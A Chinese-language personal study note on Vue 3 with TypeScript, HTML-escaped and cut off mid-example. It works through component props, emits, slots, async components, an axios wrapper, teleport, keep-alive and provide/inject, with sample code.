defineProps&lt;Props&gt;() &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;menu&quot;&gt; menu &#123;&#123;title&#125;&#125; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style lang&#x3D;&#39;less&#39; scoped&gt; &lt;&#x2F;style&gt; type Props = &#123; title: string &#125; 定义了参数类型，defineProps接受参数，就可以直接使用 复杂数据类型如需要传 let list &#x3D; reactive([1,2,3,4]) 则需要在父组件使用v-bind:(简写：) &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-01 14:05:17 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-01 14:08:02 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; reactive &#125; from &#39;vue&#39;; import Menu from &#39;.&#x2F;menu&#x2F;index.vue&#39; import Content from &#39;.&#x2F;content&#x2F;index.vue&#39; import Header from &#39;.&#x2F;header&#x2F;index.vue&#39; let list &#x3D; reactive([1,2,3,4]) &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;main&quot;&gt; &lt;Menu title&#x3D;&quot;this is title&quot; :data&#x3D;&quot;list&quot;&gt;&lt;&#x2F;Menu&gt; &lt;div class&#x3D;&quot;main-right&quot;&gt; &lt;Header&gt;&lt;&#x2F;Header&gt; &lt;Content&gt;&lt;&#x2F;Content&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style lang&#x3D;&quot;less&quot; scoped&gt; .main &#123; display: flex; overflow: hidden; .menu &#123; width: 200px; &#125; &amp;-right &#123; flex: 1; border: 1px solid blue; display: flex; flex-direction: column; &#125; &#125; &lt;&#x2F;style&gt; 子组件： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-01 14:03:10 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-01 14:07:47 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; ref &#125; from &#39;vue&#39; type Props &#x3D; &#123; title: string, data:number[] &#125; defineProps&lt;Props&gt;() &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;menu&quot;&gt; menu &#123;&#123;title&#125;&#125; &#123;&#123;data&#125;&#125; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style lang&#x3D;&#39;less&#39; scoped&gt; &lt;&#x2F;style&gt; 可选值默认值type Props = &#123; title: string, name?:string, data?:number[] &#125; withDefaults(defineProps&lt;Props>(),&#123; name:'kif', data:()=>[1,2,3,4] &#125;) 其中 name?:string, data?:number[] 表示 name 和data是可选值 withDefaults(defineProps&lt;Props>(),&#123; name:'kif', data:()=>[1,2,3,4] &#125;) 设定可选值的默认值，对于复杂数据类型（数组，对象），需要使用函数返回形式 9.2 defineEmits子组件向父组件传值 defineEmits函数会返回一个函数，参数是一个数组，数组元素为父组件接受参数的函数名。 子组件： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-01 14:05:28 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-01 14:14:43 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; reactive &#125; from &#39;vue&#39; const emit &#x3D; defineEmits([&#39;on-click&#39;]) let list &#x3D; reactive([1, 2, 3, 4]) const ckickUp &#x3D; () &#x3D;&gt; &#123; emit(&#39;on-click&#39;, list) &#125; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;header&quot;&gt; header &lt;button @click&#x3D;&quot;ckickUp&quot;&gt;点击&lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; .header &#123; &#x2F;* flex:1 *&#x2F; height: 100px &#125; &lt;&#x2F;style&gt; const emit &#x3D; defineEmits([‘on-click’]) 绑定了父组件接受参数的事件名 emit(‘on-click’, list) 传参为list 父组件： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-01 14:05:17 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-01 14:16:08 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; reactive &#125; from &#39;vue&#39;; import Menu from &#39;.&#x2F;menu&#x2F;index.vue&#39; import Content from &#39;.&#x2F;content&#x2F;index.vue&#39; import Header from &#39;.&#x2F;header&#x2F;index.vue&#39; let list &#x3D; reactive([1, 2, 3, 4]) const getList &#x3D; (list: number[]) &#x3D;&gt; &#123; console.log(list) &#125; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;main&quot;&gt; &lt;Menu title&#x3D;&quot;this is title&quot; :data&#x3D;&quot;list&quot;&gt;&lt;&#x2F;Menu&gt; &lt;div class&#x3D;&quot;main-right&quot;&gt; &lt;Header @on-click&#x3D;&quot;getList&quot;&gt;&lt;&#x2F;Header&gt; &lt;Content&gt;&lt;&#x2F;Content&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style lang&#x3D;&quot;less&quot; scoped&gt; .main &#123; display: flex; overflow: hidden; .menu &#123; width: 200px; &#125; &amp;-right &#123; flex: 1; border: 1px solid blue; display: flex; flex-direction: column; &#125; &#125; &lt;&#x2F;style&gt; @on-click&#x3D;”getList” 触发事件接受数据 ![image-20220601142656647](E:\\kifFile\\study\\Vue3 + vite + Ts + pinia + 实战 + 源码 +全栈\\Vue3学习笔记.assets\\image-20220601142656647.png) 9.3 defineExpose获取子组件实例 父组件引用子组件时使用标签 ref属性 &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-01 14:05:17 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-01 14:38:34 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; reactive,ref &#125; from &#39;vue&#39;; import Menu from &#39;.&#x2F;menu&#x2F;index.vue&#39; import Content from &#39;.&#x2F;content&#x2F;index.vue&#39; import Header from &#39;.&#x2F;header&#x2F;index.vue&#39; let list &#x3D; reactive([1, 2, 3, 4]) let header &#x3D; ref(null) const getList &#x3D; (list: number[]) &#x3D;&gt; &#123; console.log(header.value) &#125; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;main&quot;&gt; &lt;Menu title&#x3D;&quot;this is title&quot; :data&#x3D;&quot;list&quot;&gt;&lt;&#x2F;Menu&gt; &lt;div class&#x3D;&quot;main-right&quot;&gt; &lt;Header ref&#x3D;&quot;header&quot; @on-click&#x3D;&quot;getList&quot;&gt;&lt;&#x2F;Header&gt; &lt;Content&gt;&lt;&#x2F;Content&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style lang&#x3D;&quot;less&quot; scoped&gt; .main &#123; display: flex; overflow: hidden; .menu &#123; width: 200px; &#125; &amp;-right &#123; flex: 1; border: 1px solid blue; display: flex; flex-direction: column; &#125; &#125; &lt;&#x2F;style&gt; &lt;Header ref=\"header\" @on-click=\"getList\">&lt;/Header> let header = ref(null) const getList = (list: number[]) => &#123; console.log(header.value) &#125; ![image-20220601144053146](E:\\kifFile\\study\\Vue3 + vite + Ts + pinia + 实战 + 源码 +全栈\\Vue3学习笔记.assets\\image-20220601144053146.png) 此时还无法拿到 子组件使用defineExpose暴露 defineExpose(&#123; list &#125;) ![image-20220601144239332](E:\\kifFile\\study\\Vue3 + vite + Ts + pinia + 实战 + 源码 +全栈\\Vue3学习笔记.assets\\image-20220601144239332.png) 即可拿到 10.组件10.1全局组件组件Card： &lt;script setup lang&#x3D;&quot;ts&quot;&gt; type Porp &#x3D; &#123; content?: string &#125; defineProps&lt;Porp&gt;() &lt;&#x2F;script&gt; &lt;template&gt; &lt;dvi class&#x3D;&quot;card&quot;&gt; &lt;div class&#x3D;&quot;card-header&quot;&gt; &lt;div class&#x3D;&quot;title&quot;&gt; 主标题 &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;subtitle&quot;&gt; 副标题 &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;cardcontent&quot;&gt; &#123;&#123; content &#125;&#125; &lt;&#x2F;div&gt; &lt;&#x2F;dvi&gt; &lt;&#x2F;template&gt; &lt;style lang&#x3D;&quot;less&quot; scoped&gt; .crad&#123; &amp;-header&#123; display: flex; justify-content: space-between; &#125; &amp;-content&#123; padding: 20px; &#125; &#125; &lt;&#x2F;style&gt; 注册： main.ts: import &#123; createApp &#125; from 'vue' import App from './App.vue' import './assets/css/reset.less' import card from './components/card/index.vue' createApp(App).component('card',card).mount('#app') createApp(App).component(‘card’,card).mount(‘#app’) 10.2局部组件引入： import layout from './components/layout/index.vue' 10.3 递归组件父组件： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-01 14:03:10 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-01 18:11:24 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; ref, reactive &#125; from &#39;vue&#39; import Tree from &#39;..&#x2F;..&#x2F;Recursive-components&#x2F;index.vue&#39; type Props &#x3D; &#123; title: string, name?: string, data?: number[] &#125; withDefaults(defineProps&lt;Props&gt;(), &#123; name: &#39;kif&#39;, data: () &#x3D;&gt; [1, 2, 3, 4] &#125;) type treeList &#x3D; &#123; name: string, children?: treeList[] &#125; let data &#x3D; reactive&lt;treeList[]&gt;([ &#123; name: &#39;data-1&#39;, children: [ &#123; name: &#39;data-1-1&#39;, children: [ &#123; name: &#39;data-1-1-1&#39; &#125; ] &#125; ] &#125;, &#123; name: &#39;data-2&#39;, children: [ &#123; name: &#39;data-2-1&#39; &#125; ] &#125; ]) &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;menu&quot;&gt; menu &lt;br &#x2F;&gt; &#123;&#123; title &#125;&#125; &lt;br &#x2F;&gt; &#123;&#123; name &#125;&#125; &lt;br &#x2F;&gt; &lt;!-- &#123;&#123; data &#125;&#125; --&gt; &lt;br &#x2F;&gt; &lt;Tree :content&#x3D;&quot;data&quot;&gt;&lt;&#x2F;Tree&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style lang&#x3D;&#39;less&#39; scoped&gt; &lt;&#x2F;style&gt; 子组件： &lt;script setup lang&#x3D;&quot;ts&quot;&gt; &#x2F;&#x2F; import itemTree from &#39;.&#x2F;index.vue&#39; type treeList &#x3D; &#123; name: string, children?: treeList[] &#125; type Porp &#x3D; &#123; content?: treeList[] &#125; defineProps&lt;Porp&gt;() &lt;&#x2F;script&gt; &lt;script lang&#x3D;&quot;ts&quot;&gt; export default &#123; name: &#39;itemTree&#39; &#125; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div :key&#x3D;&quot;index&quot; v-for&#x3D;&quot;(item, index) in content&quot;&gt; &#123;&#123; item.name &#125;&#125; &lt;itemTree v-if&#x3D;&quot;item?.children?.length&quot; :content&#x3D;&quot;item.children&quot;&gt;&lt;&#x2F;itemTree&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 主要在： &lt;itemTree v-if&#x3D;&quot;item?.children?.length&quot; :content&#x3D;&quot;item.children&quot;&gt;&lt;&#x2F;itemTree&gt; &lt;script lang&#x3D;&quot;ts&quot;&gt; export default &#123; name: &#39;itemTree&#39; &#125; &lt;&#x2F;script&gt; 10.4 动态组件&lt;component :is&#x3D;&quot;Com&quot;&gt;&lt;&#x2F;component&gt; 根据Com动态加载不同Vue组件 子组件A： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-06 13:53:55 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-06 13:53:55 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; ref &#125; from &#39;vue&#39; &lt;&#x2F;script&gt; &lt;template&gt; AAAA &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 子组件B： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-06 13:54:05 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-06 13:54:05 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; ref &#125; from &#39;vue&#39; &lt;&#x2F;script&gt; &lt;template&gt; BBB &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 主组件： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-01 14:05:22 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-01 16:55:22 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; ref, reactive,markRaw &#125; from &#39;vue&#39; import A from &#39;.&#x2F;A.vue&#39; import B from &#39;.&#x2F;B.vue&#39; import C from &#39;.&#x2F;C.vue&#39; type Tabs &#x3D; &#123; title: string, comName: any &#125; type Com &#x3D; Pick&lt;Tabs, &#39;comName&#39;&gt; let data &#x3D; reactive&lt;Tabs[]&gt;([ &#123; title: &#39;A&#39;, comName: markRaw(A) &#125;, &#123; title: &#39;B&#39;, comName: markRaw(B) &#125;, &#123; title: &#39;C&#39;, comName:markRaw(C) &#125; ]) &#x2F;&#x2F; let surrentTab &#x3D; ref(data[tabIndex.value].comName) let surrentTab &#x3D; reactive&lt;Com&gt;(&#123; comName: data[0].comName &#125;) let changeTab &#x3D; (index: number) &#x3D;&gt; &#123; surrentTab.comName &#x3D; data[index].comName &#125; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;content&quot;&gt; content &lt;div class&#x3D;&quot;Com&quot; v-for&#x3D;&quot;(item, index) in data&quot; :key&#x3D;&quot;item.title&quot;&gt; &lt;button @click&#x3D;&quot;changeTab(index)&quot;&gt;&#123;&#123; item.title &#125;&#125;&lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;component :is&#x3D;&quot;surrentTab.comName&quot;&gt;&lt;&#x2F;component&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; .content &#123; &#x2F;* height: 100px; *&#x2F; flex: 1; overflow: auto; border: 2px solid green; padding: 20px; &#125; &lt;&#x2F;style&gt; 解析： 通过 import A from './A.vue' import B from './B.vue' import C from './C.vue' 引入三个组件 定义Tab类型： type Tabs &#x3D; &#123; title: string, comName: any &#125; 定义动态的data类型Tabs数组 let data &#x3D; reactive&lt;Tabs[]&gt;([ &#123; title: &#39;A&#39;, comName: (A) &#125;, &#123; title: &#39;B&#39;, comName: (B) &#125;, &#123; title: &#39;C&#39;, comName:(C) &#125; ]) 定义surrentTab，其默认值是data第一个元素的组件 let surrentTab &#x3D; reactive&lt;Com&gt;(&#123; comName: data[0].comName &#125;) 页面即引入动态组件： &lt;component :is&#x3D;&quot;surrentTab.comName&quot;&gt;&lt;&#x2F;component&gt; 通过事件动态改变组件加载： let changeTab &#x3D; (index: number) &#x3D;&gt; &#123; surrentTab.comName &#x3D; data[index].comName &#125; 此时会有警告： [Vue warn]: Vue received a Component which was made a reactive object. This can lead to unnecessary performance overhead, and should be avoided by marking the component with markRaw or using shallowRef instead of ref. Component that was made reactive: 原因是reactive会引用Porxy代理每个组件，但这里不会改变组件，所以需要取消Porxy代理 let data &#x3D; reactive&lt;Tabs[]&gt;([ &#123; title: &#39;A&#39;, comName: markRaw(A) &#125;, &#123; title: &#39;B&#39;, comName: markRaw(B) &#125;, &#123; title: &#39;C&#39;, comName:markRaw(C) &#125; ]) markRow原理：实际上是给对象加上一个__v-skip属性并置为true，使其跳过代理 11.插槽slot11.1 匿名插槽子组件留下的一个空，父组件可以在此填入东西 父组件： &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import child from &#39;.&#x2F;child.vue&#39; &lt;&#x2F;script&gt; &lt;template&gt; &lt;!-- kk --&gt; &lt;child&gt; &lt;template v-slot&gt; &lt;div class&#x3D;&quot;fu&quot;&gt; 父组件传过来的内容 &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;&#x2F;child&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 子组件： &lt;script setup lang&#x3D;&quot;ts&quot;&gt; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;main&quot;&gt; child &lt;slot&gt;&lt;&#x2F;slot&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 子组件通过 &lt;slot&gt;&lt;&#x2F;slot&gt; 做一个标记 父子间在组件内容里通过v-slot插入内容 11.2 具名插槽子组件slot使用name属性，父组件v-slot:name插入具体位置 子组件 &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-06 14:24:37 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-06 14:24:37 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; ref &#125; from &#39;vue&#39; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;footer&quot;&gt; &lt;slot name&#x3D;&quot;footer&quot;&gt;&lt;&#x2F;slot&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 父组件： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-06 14:25:26 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-06 14:25:26 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import child from &#39;.&#x2F;child.vue&#39; &lt;&#x2F;script&gt; &lt;template&gt; &lt;!-- kk --&gt; &lt;child&gt; &lt;template v-slot:footer&gt; &lt;div class&#x3D;&quot;fu&quot;&gt; 父组件传过来的内容2 &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;&#x2F;child&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; v-slot:footer 可以简写为 #footer 11.3 插槽作用域子组件 slot可以把子组件的数据暴露给父组件 子组件： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-06 14:24:37 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-06 14:46:25 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; reactive &#125; from &#39;vue&#39; type persion &#x3D; &#123; name: string, age: number &#125; let data &#x3D; reactive&lt;persion[]&gt;([ &#123; name: &#39;kif&#39;, age: 18 &#125;, &#123; name: &#39;kif2&#39;, age: 18 &#125; ]) &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;main&quot;&gt; child &lt;slot :data&#x3D;&quot;data&quot;&gt;&lt;&#x2F;slot&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; &lt;slot :data&#x3D;&quot;data&quot;&gt;&lt;&#x2F;slot&gt; 暴露data 父组件： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-06 14:25:26 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-06 14:48:01 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import child from &#39;.&#x2F;child.vue&#39; &lt;&#x2F;script&gt; &lt;template&gt; &lt;!-- kk --&gt; &lt;child&gt; &lt;template v-slot&#x3D;&quot;data&quot;&gt; &lt;div class&#x3D;&quot;fu&quot;&gt; 父组件传过来的内容 子组件暴露的内容： &#123;&#123;data&#125;&#125; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;&#x2F;child&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; v-slot&#x3D;”data” 可以简写为 #default&#x3D;“data” 11.4 动态插槽父组件： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-06 14:25:26 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-06 14:58:52 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; ref, reactive &#125; from &#39;vue&#39; import child from &#39;.&#x2F;child.vue&#39; let s &#x3D; ref(&#39;footer&#39;) &lt;&#x2F;script&gt; &lt;template&gt; &lt;!-- kk --&gt; &lt;child&gt; &lt;template #[s]&gt; &lt;div&gt; 位置 &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;&#x2F;child&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; #[s]中 改变s值就可以动态插入 12.异步组件、代码分包、suspense子组件需要异步操作（请求、加载图表）时，一般组件引入模式异步加载完不会显示相应数据，所以需要异步引入； 其次，所有vue打包之后都会在一个js文件里面，这样首屏加载时间过长，因此需要分包； 异步组件： &lt;script setup lang&#x3D;&quot;ts&quot;&gt; let getTest &#x3D; function () &#123; return new Promise((resolve, reject) &#x3D;&gt; &#123; setTimeout(() &#x3D;&gt; &#123; resolve(&#123; code: 0, data: &#123; name: &#39;test&#39; &#125; &#125;) &#125;, 2000) &#125;) &#125; let res &#x3D; await getTest() console.log(res) &lt;&#x2F;script&gt; &lt;template&gt; 异步组件： &#123;&#123; res &#125;&#125; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; getTest函数在2秒后返回数据，此组件是一个异步组件； 主组件： &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-01 14:05:22 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-06 15:43:27 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import asyncCom from &#39;.&#x2F;asyncCom.vue&#39; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;content&quot;&gt; &lt;asyncCom&gt;&lt;&#x2F;asyncCom&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 此时通过 import asyncCom from &#39;./asyncCom.vue&#39;导入是无法显示数据的 需要引入 defineAsyncComponent defineAsyncComponent导入方式： import &#123; defineAsyncComponent &#125; from &#39;vue&#39; 引入组件： let asyncCom &#x3D; defineAsyncComponent(() &#x3D;&gt; import(&#39;.&#x2F;asyncCom.vue&#39;)) 还需使用 Suspense Suspense&lt;Suspense&gt; &lt;template #default&gt; &lt;asyncCom&gt;&lt;&#x2F;asyncCom&gt; &lt;&#x2F;template&gt; &lt;template #fallback&gt; &lt;div&gt; loading...&lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;&#x2F;Suspense&gt; 其中 &lt;template #default&gt; &lt;asyncCom&gt;&lt;&#x2F;asyncCom&gt; &lt;&#x2F;template&gt; 用来包裹子组件 &lt;template #fallback&gt; &lt;div&gt; loading...&lt;&#x2F;div&gt; &lt;&#x2F;template&gt; 表示在未加载之前显示loading… 13.axios引入安装： npm install axios -S request.ts import axios from &#39;axios&#39; &#x2F;&#x2F; import &#123; ElMessage &#125; from &#39;element-plus&#39; &#x2F;&#x2F; import &#123; getToken &#125; from &#39;@&#x2F;utils&#x2F;auth&#39; export const request &#x3D; (options: any) &#x3D;&gt; &#123; return new Promise((resolve, reject) &#x3D;&gt; &#123; &#x2F;&#x2F; create an axios instance const service &#x3D; axios.create(&#123; &#x2F;&#x2F; baseURL: process.env.BASE_API, &#x2F;&#x2F; api 的 base_url baseURL: &#39;&#x2F;api&#39;, timeout: 80000 &#x2F;&#x2F; request timeout &#125;) &#x2F;&#x2F; request interceptor service.interceptors.request.use( (config: any) &#x3D;&gt; &#123; let token: string &#x3D; &#39;&#39;&#x2F;&#x2F;此处换成自己获取回来的token，通常存在在cookie或者store里面 if (token) &#123; &#x2F;&#x2F; 让每个请求携带token-- [&#39;X-Token&#39;]为自定义key 请根据实际情况自行修改 config.headers[&#39;X-Token&#39;] &#x3D; token config.headers.Authorization &#x3D; + token &#125; return config &#125;, error &#x3D;&gt; &#123; &#x2F;&#x2F; Do something with request error console.log(&quot;出错啦&quot;, error) &#x2F;&#x2F; for debug Promise.reject(error) &#125; ) &#x2F;&#x2F; response interceptor service.interceptors.response.use( (response: any) &#x3D;&gt; &#123; return response.data &#125;, error &#x3D;&gt; &#123; console.log(&#39;err&#39; + error) &#x2F;&#x2F; for debug if (error.response.status &#x3D;&#x3D; 403) &#123; console.error(&#39;错了&#39;) &#125; else &#123; console.error(&#39;服务器请求错误，请稍后再试&#39;) &#125; return Promise.reject(error) &#125; ) &#x2F;&#x2F; 请求处理 service(options) .then((res) &#x3D;&gt; &#123; resolve(res) &#125;) .catch((error) &#x3D;&gt; &#123; reject(error) &#125;) &#125;) &#125; export default request 调用： import &#123;request&#125; from &#39;@&#x2F;utils&#x2F;request&#39; &#x2F;&#x2F; 调用测试 export function getTest() &#123; return request(&#123; url: &#39;&#x2F;xxxxx&#x2F;&#39;,&#x2F;&#x2F;此处为自己请求地址 method: &#39;get&#39; &#125;) &#125; import &#123; getTest&#125; from &quot;@&#x2F;service&#x2F;test&quot;; onBeforeMount(() &#x3D;&gt; &#123; getTest() .then(response &#x3D;&gt; &#123; console.log(&quot;结果&quot;, response); &#125;) .catch(error &#x3D;&gt; &#123; console.log(&#39;获取失败！&#39;) &#125;); &#125;) 14.teleport&#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-07 15:42:12 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-07 15:42:12 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;main&quot;&gt;\\ &lt;teleport to&#x3D;&#39;html&#39;&gt; &lt;div class&#x3D;&quot;te&quot;&gt; loading &lt;&#x2F;div&gt; &lt;&#x2F;teleport&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; &lt;teleport to=&#39;html&#39;&gt;表示这个内容在html下方，则main的样式不会对te生效 注意:main 元素v-show不会对te影响，但v-if会影响 15.keep-alivev-if切换一般会销毁组件，keepalive可以保存组件状态 &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-07 15:51:23 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-07 16:02:10 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; ref, reactive, markRaw, defineAsyncComponent &#125; from &#39;vue&#39; import login from &#39;.&#x2F;login.vue&#39; import register from &#39;.&#x2F;register.vue&#39; let flag &#x3D; ref(false) const change &#x3D; () &#x3D;&gt; &#123; flag.value &#x3D; !flag.value &#125; &lt;&#x2F;script&gt; &lt;template&gt; keepalive &lt;button @click&#x3D;&quot;change&quot;&gt;toggle&lt;&#x2F;button&gt; &lt;keep-alive&gt; &lt;login v-if&#x3D;&quot;flag&quot;&gt;&lt;&#x2F;login&gt; &lt;register v-else&gt;&lt;&#x2F;register&gt; &lt;&#x2F;keep-alive&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 16.依赖注入Provide、inject导入： import &#123;provide, inject&#125; from &#39;vue&#39; 根组件注入数据后，所有子组件都可以访问到 provide(&#39;data&#39;, data) 函数两个参数值：键，值 father.vue &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-07 17:03:11 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-07 17:36:55 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123;provide, inject,reactive&#125; from &#39;vue&#39; import child1 from &#39;.&#x2F;child1.vue&#39; let data &#x3D;reactive(&#123; name: &#39;kif&#39; &#125;) provide(&#39;data&#39;, data) &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;main&quot;&gt; main 根组件数据：&#123;&#123;data&#125;&#125; &lt;div class&#x3D;&quot;child1&quot;&gt; &lt;child1 &#x2F;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; .main &#123; background-color: blueviolet; width: 300px; height: 300px; &#125; .child1 &#123; background-color: green; width: 200px; height: 200px; &#125; &lt;&#x2F;style&gt; child1.vue &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-07 17:03:25 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-07 17:38:49 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import child2 from &#39;.&#x2F;child2.vue&#39; import &#123; provide, inject, reactive &#125; from &#39;vue&#39; &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-07 17:03:25 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-07 17:38:49 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import child2 from &#39;.&#x2F;child2.vue&#39; import &#123; provide, inject, reactive &#125; from &#39;vue&#39; let d &#x3D; inject(&#39;data&#39;, reactive(&#123; name: &#39;kif&#39; &#125;)) const change &#x3D; () &#x3D;&gt; &#123; d.name &#x3D; &#39;kif1&#39; &#125; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;child&quot;&gt; child1 一级子组件拿到数据：&#123;&#123; d &#125;&#125; &lt;button @click&#x3D;&quot;change&quot;&gt;change&lt;&#x2F;button&gt; &lt;div class&#x3D;&quot;child2&quot;&gt; &lt;child2 &#x2F;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; .child2 &#123; background-color: red; width: 100px; height: 100px; &#125; &lt;&#x2F;style&gt; const change &#x3D; () &#x3D;&gt; &#123; d.name &#x3D; &#39;kif1&#39; &#125; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;child&quot;&gt; child1 一级子组件拿到数据：&#123;&#123; d &#125;&#125; 